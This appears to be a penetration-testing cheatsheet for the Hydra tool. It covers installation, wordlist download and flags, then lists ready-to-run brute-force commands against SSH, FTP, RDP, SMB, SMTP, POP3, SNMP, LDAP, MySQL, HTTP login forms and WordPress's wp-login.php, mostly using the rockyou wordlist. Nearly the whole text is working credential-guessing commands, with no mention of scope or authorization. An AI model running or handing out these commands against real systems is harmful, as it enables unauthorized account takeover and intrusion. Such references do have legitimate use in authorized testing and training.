Hydra Cheatsheet

How to install Hydra and wordlists

Hydra installation:

Installation
username@machine_name:~$ sudo apt install hydra-gtk

Wordlists download

Wordlists
username@machine_name:~$ git clone https://github.com/danielmiessler/SecLists

Useful tag for Hydra


-l <LOGIN>: Pass single username/login
-L <FILE>: Pass multiple usernames/logins
-p <LOGIN>: Pass single known password
-P <FILE>: Pass a password list or wordlist (ex.: rockyou.txt)
-s <PORT>: Use custom port
-f: Exit as soon as at least one a login and a password combination is found
-R: Restore previous session (if crashed/aborted)

Exemple of hydra command

Hydra brute force against SNMP:

SNMP
username@machine_name:~$ hydra -P password-file.txt -v $ip snmp

Hydra brute force against FTP:

FTP
username@machine_name:~$ hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP ftp

Hydra brute force against ssh:

ssh
username@machine_name:~$ hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP -t 4 ssh

Hydra brute force against POP3:

POP3
username@machine_name:~$ hydra -L users.txt -P passwords.txt -f $ip pop3 -V

Hydra brute force against SMTP:

SMTP
username@machine_name:~$ hydra -P passwords.txt $ip smtp -V

Hydra brute force against http-post-form:

http-post-form
username@machine_name:~$ hydra -l user -P /usr/share/wordlists/rockyou.txt $IP http-post-form "<Login Page>:<Request Body>:<Error Message>"

Hydra brute force against RDP:

RDP
username@machine_name:~$ hydra -f -l administrator -P /usr/share/wordlists/rockyou.txt rdp://$IP

Hydra brute force against SMB:

SMB
username@machine_name:~$ hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP smb

Hydra brute force against WordPress:

WordPress
username@machine_name:~$ hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&test-cookie=1:S=Location'

Hydra brute force against LDAP:

LDAP
username@machine_name:~$ hydra -l user -P /usr/share/wordlists/rockyou.txt $IP ldap2 -V -f

Hydra brute force against MySQL:

MySQL
username@machine_name:~$ hydra -f -l user -P /usr/share/wordlists/rockyou.txt $IP mysql
